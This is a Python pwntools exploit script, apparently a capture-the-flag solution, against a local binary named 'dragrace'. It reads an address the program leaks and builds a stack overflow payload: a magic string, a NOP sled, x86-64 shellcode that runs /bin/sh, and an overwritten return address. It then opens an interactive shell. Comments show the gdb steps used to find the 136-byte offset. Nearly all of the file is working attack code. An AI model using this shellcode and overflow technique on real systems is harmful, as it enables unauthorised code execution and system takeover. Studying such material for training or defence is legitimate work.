#!/usr/bin/python

from pwn import * 

p = process("./dragrace")

def main(): 
	payload = ""
	payload += p8(0x52) # R
	payload += p8(0x75) # u
	payload += p8(0x27) # '
	payload += p8(0x50) # P
	payload += p8(0x61) # a
	payload += p8(0x75) # u
	payload += p8(0x6c) # l
	payload += p8(0x73) # s

	shellcode = "\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf"
	shellcode += "\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54"
	shellcode += "\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

	data = p.recvline() # Stores reply from program into a variable

	# Only finds string that begins with 0x, which means hex address
	pearl_addr = data[ data.find("0x") : ] # Address will be in string 
	pearl_addr = int(pearl_addr, 16) # Converts string to hex
	log.info("pearl_addr : 0x%x" % pearl_addr)

	# Determine return address
	ret_addr = pearl_addr + 0x8 # After the string : Ru'Pauls 
	log.info("ret_addr : 0x%x" % ret_addr)

	'''
	0x000000000040077f <+25>:    lea    rax,[rbp-0x80] (Preparing stack for strcpy)

	gdb-peda$ x/2gx $rbp
	0x7fffffffe3e0: 0x00000000004008f0($rbp)  0x00007ffff7a2d830($rip)

	gdb-peda$ x $rbp - 0x80
	0x7fffffffe360: 0x000000000000000f(Start of stack)

	gdb-peda$ x/gx 0x7fffffffe3e8($rip)
	0x7fffffffe3e8: 0x00007ffff7a2d830

	gdb-peda$ distance 0x7fffffffe360(Start of stack) 0x7fffffffe3e8($rip)
	From 0x7fffffffe360(Start of stack) to 0x7fffffffe3e8($rip) : 136 bytes
	'''
	NOP = '\x90' * (136 - len(payload) - len(shellcode))

	# Crafts final payload
	payload += NOP 
	payload += shellcode
	payload += p64(ret_addr)

	skip_prompt()

	raw_input(str(p.proc.pid))
	p.sendline(payload)
	log.info("%s sent!" % payload)

	p.interactive()	

def skip_prompt():
	p.recvrepeat(0.2)

if __name__ == "__main__":
	main()
